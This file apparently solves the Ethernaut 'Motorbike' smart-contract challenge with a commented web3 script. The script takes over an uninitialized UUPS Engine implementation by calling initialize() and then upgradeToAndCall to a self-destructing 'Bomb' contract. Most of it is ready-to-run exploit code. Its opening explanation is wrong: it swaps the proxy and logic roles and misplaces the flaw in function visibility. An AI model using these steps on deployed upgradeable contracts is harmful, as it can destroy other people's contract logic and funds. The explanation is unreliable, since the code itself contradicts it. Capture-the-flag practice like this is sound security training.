/*
    Must read the required reading material given in the level

    Let's jump down to the explaination, (Hoping you really figured out the code question, I know it's be really hard to look at it but still try to atleast understand it a bit)

    So, there are two contracts Motorbike and Engine, in which Engine is the proxy and Motorbike is the logic contract.

    Vulnerability - The main vulnerability is in the initialize() function inside the Engine contract, You must have noticed that the function visibility is set to 'external' which makes it possible to get called again, whereas in UUPS the initialize function must be called just once.

    In order to take the advantage of this vulnerability, we be doing the following steps and solve this problem!
*/

// This line gets us the address of the Engine contract, Make sure that the 'IMPLEMENTATION' slot provides us the desired slot for our address.
implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')

// You must have got some address but with a lot of '0' in front of it, thus this line makes the address more intact.
implAddr = '0x' + implAddr.slice(-40)

// Next two lines calls the function initialize() inside the Engine proxy
initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")
await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData})

// Take a look at the upgrader function, you will easily get why these lines are coded down below
upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()") 
await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase() 

// Just copy down the code in 26.Attack.sol in remix and copy the address down here
bombAddr = "<Your contract address>" 

// Now, we have to call the explode() function of our Bomb contract, Rest of the lines makes that damn clear
explodeData = web3.eth.abi.encodeFunctionSignature("explode()") 

upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

upgradeParams = [bombAddr, explodeData] 

upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams) 

await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData}) 

